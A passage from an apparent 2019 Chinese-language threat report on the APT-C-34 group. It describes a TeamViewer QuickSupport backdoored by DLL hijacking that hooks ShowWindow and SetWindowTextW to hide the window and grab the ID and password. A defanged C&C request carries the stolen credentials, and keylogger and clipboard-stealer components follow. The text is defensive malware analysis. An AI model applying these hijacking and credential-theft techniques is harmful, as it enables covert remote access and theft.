@@ -1,0 +1,23 @@
+TeamViewer Hijacker
+该组织通过 DLL 劫持改造的 TeamViewer QuickSupport 软件，当恶意 DLL 加载后会进⾏系统 API
+Hook ，进⽽隐藏正常的程序窗⼝，并将 ID 和 Password 发送到 C&C 服务器。
+正常的 TeamViewer QuickSupport 由主程序、 Teamviewer_Resource_fr.dll 和 tv.dll 三个⽂件构成，
+该组织加⼊了⼀个后⻔ dll 程序将该软件改造成后⻔。后⻔替换了原有的 tv.dll ⽂件，将原有的功能库
+tv.dll 重信命名为 userinit.dll ，同时伪造的 tv.dll 与原模块具有相同的导出表结构，再通过加载
+blogs.360.cn/post/APT-C-34_Golden_Falcon.html 8/22
+11/22/2019 盘旋在中亚上空的阴影-黄⾦雕（APT-C-34）组织攻击活动揭露 - 360 核⼼安全技术博客
+userinit.dll 来⽀持原有逻辑。
+伪造的 tv.dll 通过 Inline Hook API ShowWindow 使正常 TeamViewer 窗⼝隐藏，并 Hook
+SetWindowTextW 获取 ID 和 Password 。
+上图为正常的 TeamViewer QuickSupport 程序窗⼝，伪装 DLL
+通过 Hook 系统 API ShowWindow ，并修改显示参数为
+通过 Hook API SetWindowsTextW 来获取 TeamViewer 的 ID 和 Password
+随后构造 Get 请求，将 Id 和 Password 上传到 C&C ：
+hxxp:// .ru/ /get .php? =1&n=31337&u=7&id=xx&pwd=xx&m=d4628443
+blogs.360.cn/post/APT-C-34_Golden_Falcon.html 9/22
+11/22/2019 盘旋在中亚上空的阴影-黄⾦雕（APT-C-34）组织攻击活动揭露 - 360 核⼼安全技术博客
+另⼀⽅⾯，恶意程序会在⽬录下寻找名为 msmm.exe 和 msmn.exe 的⽂件，如果存在则通过
+WinExec 执⾏，其主要功能为键盘记录和剪切板内容窃取。
+查找名为 MSM?.DLL 的 DLL ⽂件，如果存在则会加载该 DLL ，执⾏ Init 导出函数，该 DLL 的功能也
+为键盘和剪切板记录。
+值得注意的是，在伪装的 DLL 中，后部分代码使⽤了虚拟机进⾏保护, 解析执⾏ Bytecode 。
